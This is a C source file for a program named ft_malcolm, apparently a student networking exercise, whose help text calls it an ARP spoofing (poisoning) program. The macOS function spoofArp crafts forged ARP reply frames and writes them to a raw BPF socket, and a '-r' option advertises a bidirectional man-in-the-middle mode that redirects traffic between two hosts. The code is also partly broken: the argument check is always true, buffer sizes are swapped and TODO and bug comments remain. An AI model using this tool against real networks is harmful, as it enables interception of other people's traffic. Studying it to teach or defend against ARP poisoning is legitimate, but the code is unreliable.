# include "ft_malcolm.h"


# ifdef OSX
int	spoofArp(ft_malcolm *malc)
{
	size_t					packageSize = sizeof(struct ether_header) + sizeof(struct ether_arp);
	struct ether_header		*ethhdr = NULL;
	struct ether_arp		*arphdr = NULL;
	struct ether_addr		localMac;
	struct sockaddr			sIpSrc;
	struct sockaddr			sIpTarget;

	if (!(malc->msg = malloc(packageSize)))
	{
		dprintf(STDERR_FILENO, "Malloc msg failed: %s\n", strerror(errno));
		return EXIT_FAILURE;
	}
	ethhdr = (struct ether_header *)malc->msg;
	arphdr = (struct ether_arp *)(ethhdr + 1);

	if (getIfMacAddress(&localMac, malc->ifName))
		return EXIT_FAILURE;

    dprintf(STDOUT_FILENO, "interface: `%s` has MAC address equal to: %02x:%02x:%02x:%02x:%02x:%02x\n", 			malc->opt.ifName,
		localMac.octet[0], localMac.octet[1],
		localMac.octet[2], localMac.octet[3],
		localMac.octet[4], localMac.octet[5]);




// TODO targetMac == address mac de target et localIP uniquement get par -i
	/* fill ethernet header */
	fillEtherPacket(ethhdr, &malc->targetMac, &malc->srcMac, ETHERTYPE_ARP);
	/* fill arp header */
	fillArpPacket(arphdr, &malc->srcMac, &localMac, malc->srcIp, malc->targetIp, ARPOP_REPLY);

	/* Send package */
	char macBuf1[INET_ADDRSTRLEN];
	char macBuf2[INET_ADDRSTRLEN];
	char ipBuf1[ETHER_ADDRSTRLEN];
	char ipBuf2[ETHER_ADDRSTRLEN];
	ssize_t ret = 0;
	ipToSockaddr(malc->srcIp, &sIpSrc);
	ipToSockaddr(malc->targetIp, &sIpTarget);
	dprintf(STDOUT_FILENO, "Sending reply to: %s at %s telling that %s is at %s\n",
		ipToStr(&sIpSrc, macBuf1, INET_ADDRSTRLEN),
		macToStr(&malc->srcMac, ipBuf1),
		ipToStr(&sIpTarget, macBuf2, INET_ADDRSTRLEN),
		macToStr(&malc->targetMac, ipBuf2));
	dprintf(STDOUT_FILENO, "Sending frame with a size of: %lu \n", packageSize);
	ret = write(malc->socket, malc->msg, packageSize);
	dprintf(STDOUT_FILENO, "Size sended: %ld\n", ret);

	return EXIT_SUCCESS;
}
# endif//OSX 

int		getInterfaces(ft_malcolm *malc, int all)
{
	char			buff[42];
	struct ifaddrs	*if_current;

	if (getifaddrs(&if_current))
	{
		dprintf(STDOUT_FILENO, "Fail to fetch interfaces because of : %s\n", strerror(errno));
		return EXIT_FAILURE;
	}

	dprintf(STDOUT_FILENO, "Interfaces found:\n");
	malc->all_ifs = if_current;
	while (if_current)
	{
		if (if_current->ifa_addr->sa_family == AF_INET)
		{
			dprintf(STDOUT_FILENO, "%10s - %s - %s\n", if_current->ifa_name, (if_current->ifa_addr->sa_family == AF_INET ? "IPv4" : "IPv6"), ipToStr(if_current->ifa_addr, buff, 41));
			if (!all && ft_strcmp(if_current->ifa_name, "lo0"))
				malc->used_ifs = if_current;
		}
		if_current=if_current->ifa_next;
	}
	dprintf(STDOUT_FILENO, "using interface [%s] %d\n", malc->used_ifs->ifa_name, IF_NAMESIZE);
	return EXIT_SUCCESS;
}


int init_connection(ft_malcolm * malc, char **av)
{
	// ft_memset(&malc->conn, '\0', sizeof(struct sockaddr_in));

	/* Get interface name */
	if (getInterfaces(malc, 0))
		return EXIT_FAILURE;
	ft_strncpy(malc->ifName, malc->used_ifs->ifa_name, IF_NAMESIZE);

	/* Get IP of this interface */
	ft_memcpy(malc->ownIP, malc->used_ifs->ifa_addr->sa_data, IPV4_ADDR_LEN);
	
	/* extract MAC  target 1*/
	ft_capitalize(av[1]);
	strToMac(&malc->srcMac, av[1]);
	if (malc->opt.verbose)
		printMac(&malc->srcMac, "target1 MAC address:");
	ft_capitalize(av[3]);

	/* extract MAC  target 2*/
	strToMac(&malc->targetMac, av[3]);
	if (malc->opt.verbose)
		printMac(&malc->targetMac, "target2 MAC address:");

	struct hostent *hps = gethostbyname(av[0]);
	if (!hps)
	{
		dprintf(STDERR_FILENO, "Unable to resolve %s\n", av[0]);
		return EXIT_FAILURE;	
	}
	dprintf(STDOUT_FILENO, "Hostname: %s, was resolved to: %s\n",
           av[0],inet_ntoa(*(struct in_addr*)hps->h_addr_list[0]));
	ft_memcpy(malc->srcIp, hps->h_addr_list[0], IPV4_ADDR_LEN);



	struct hostent *hpt = gethostbyname(av[2]);
	if (!hpt)
	{
		dprintf(STDERR_FILENO, "Unable to resolve %s\n", av[2]);
		return EXIT_FAILURE;	
	}
	dprintf(STDOUT_FILENO, "Hostname: %s, was resolved to: %s\n",
		av[2],inet_ntoa(*(struct in_addr*)hpt->h_addr_list[0]));
	ft_memcpy(malc->targetIp, hpt->h_addr_list[0], IPV4_ADDR_LEN);


	/* Fill sockaddr(s) with ip */
	char buf[INET_ADDRSTRLEN];
	ipToSockaddr(malc->srcIp, &malc->sockSrcIp);
	ipToSockaddr(malc->targetIp, &malc->sockTargetIp);

	dprintf(STDOUT_FILENO, "source IP: %s\n", ipToStr(&malc->sockSrcIp, buf, INET_ADDRSTRLEN));
	dprintf(STDOUT_FILENO, "target IP: %s\n", ipToStr(&malc->sockTargetIp, buf, INET_ADDRSTRLEN));
	

	return EXIT_SUCCESS;
}

# ifdef LINUX
uint32_t	ft_malcolm_linux(ft_malcolm *malc)
{
	int					enableBroadcast = 1;
	struct sockaddr si_other;
	// struct sockaddr_ll	socket_address;
	if (malc->opt.verbose)
		dprintf(STDOUT_FILENO, "Working on Linux\n");

	// Create a socket enabled for receiving ARP packets
	if ((malc->socket = socket(AF_PACKET, SOCK_RAW, ETH_P_ARP)) < 0)
	{
		dprintf(STDERR_FILENO, "Failed to initialize socket: %s\n", strerror(errno));
		return EXIT_FAILURE;
	}
	if (setsockopt(malc->socket, SOL_SOCKET, SO_BROADCAST, &enableBroadcast, sizeof(enableBroadcast)))
	{
		dprintf(STDERR_FILENO, "Failed to set socket SO_BROADCAST option: %s\n", strerror(errno));
		return EXIT_FAILURE;	
	}
	dprintf(STDOUT_FILENO, "Binding socket to interface [%s]\n", malc->ifName);
	if (setsockopt(malc->socket, SOL_SOCKET, SO_BINDTODEVICE, &malc->ifName, sizeof(malc->ifName)))
	{
		dprintf(STDERR_FILENO, "Failed to set socket SO_BINDTODEVICE option: %s\n", strerror(errno));
		return EXIT_FAILURE;	
	}


	char	buf[10000];
	char	buf2[42];
	int		ret = 0;
	unsigned slen=sizeof(struct sockaddr);
	dprintf(STDOUT_FILENO, "wait incoming data\n");
	while(1)
	{
	    ret = recvfrom(malc->socket, buf, sizeof(buf)-1, 0, (struct sockaddr *)&si_other, &slen);
		if (ret < 0)
		{
			dprintf(STDERR_FILENO, "Recvfrom failed because of: %s\n", strerror(errno));
			return EXIT_FAILURE;
		}
		buf[ret] = '\0';
	    dprintf(STDOUT_FILENO, "recv: %s from %s\n", buf, ipToStr(((struct sockaddr*)&si_other), buf2, 41));
	}

	return EXIT_SUCCESS;
}
# endif //LINUX

//BUG Surement une erreur: je répond à srcIp et non à l'emitteur de la request: c'est pas une bonne idée
int	clean_quit(ft_malcolm *malc)
{
	dprintf(STDOUT_FILENO, "Cleaning program...\n");
	close(malc->socket);
	freeifaddrs(malc->all_ifs);
	return EXIT_SUCCESS;
}
# ifdef OSX

int		ft_malcolm_osx(ft_malcolm *malc)
{
	if (malc->opt.verbose)
		dprintf(STDOUT_FILENO, "Working on OSX\n");
	if (openBpfFile(&malc->socket, STDOUT_FILENO, malc->opt.verbose)
		|| bpfSetOption(malc)
		|| bpfCheckDlt(malc)
		|| bpfSetFilter(malc))
	{
		dprintf(STDERR_FILENO, "ft_malcolm iniailization failed\n");
		return EXIT_FAILURE;
	}
	if (read_packets(malc))
		return EXIT_FAILURE;
	close(malc->socket);

	return EXIT_SUCCESS;
}
# endif //OSX


int parsing_arguments(int ac, char **av, ft_malcolm *malc)
{
	char			buf1[256];
	char			buf2[256];
	struct argparse	argparse;
	const char	*const usages[] = { buf1, buf2, NULL };

//
	if (ft_strlen(av[0]) > 100)
		av[0][100] = '\0';

	buf1[sprintf(buf1, "%s    [options] [--] source_ip source_mac ip_to_usurp", av[0])] = '\0';
	buf2[sprintf(buf2, "%s -r [options] [--] source_ip source_mac target_ip target_mac", av[0])] = '\0';

	struct argparse_option options[] = {
        OPT_HELP(),
        OPT_GROUP("Basic options"),
        OPT_STRING('i', "interface", &malc->opt.ifName, "Force to use a specific interface.", NULL, 0, 0),
        OPT_GROUP("Modes:"),
        OPT_BOOLEAN('v', "verbose", &malc->opt.verbose, "Enable verbose mode.", NULL, 0, 0),
        OPT_BOOLEAN('r', "reverse", &malc->opt.reverse, "Bidirectional spoof (Man-in-the-middle).", NULL, 0, 0),
		//add timeout with socket option SO_RCVTIMEO (add option -t second)
        OPT_END(),
    };

    argparse_init(&argparse, options, usages, 0);
    argparse_describe(&argparse, "\nARP spoofing (poisoning) program.", "\nBy default this program redirect all data from source to target_ip\ninto the first available interface.");
    ac = argparse_parse(&argparse, ac, (const char**)av);
	if (ac < 5 || ac > 2)
	{
		if ((malc->opt.reverse && ac == 3)
			||	(!malc->opt.reverse && ac == 4))
			return EXIT_SUCCESS;
	}
	argparse_usage(&argparse);
	return EXIT_FAILURE;
}

static void	displayOptState(ft_malcolm *malc)
{
	dprintf(STDOUT_FILENO, "Mode:\n");
	if (malc->opt.reverse)
		dprintf(STDOUT_FILENO, "-r	Bidirectional mode: redirect to us every communications between the source and the target.\n");
	if (malc->opt.verbose)
		dprintf(STDOUT_FILENO, "-v	Verbose mode: display more informations.\n");
	// if (malc->opt.ifName)
		// dprintf(STDOUT_FILENO, "-i	interface mode: display more informations.\n");
	
	return ;
}

int main(int ac, char **av)
{
	ft_malcolm	malc;

	if (parsing_arguments(ac, av, &malc)
	||	init_connection(&malc, av))
		return EXIT_FAILURE;
	if (malc.opt.verbose)
	{
		dprintf(STDOUT_FILENO, "Verbose mode enabled.\n");
		displayOptState(&malc);
	}
	else
		dprintf(STDOUT_FILENO, "Verbose mode disabled.\n");


# ifdef LINUX
	if (ft_malcolm_linux(&malc))
		return EXIT_FAILURE;
# elif defined OSX
	if (ft_malcolm_osx(&malc))
		return EXIT_FAILURE;

# endif
	if (clean_quit(&malc))
		return EXIT_FAILURE;
	return EXIT_SUCCESS;
}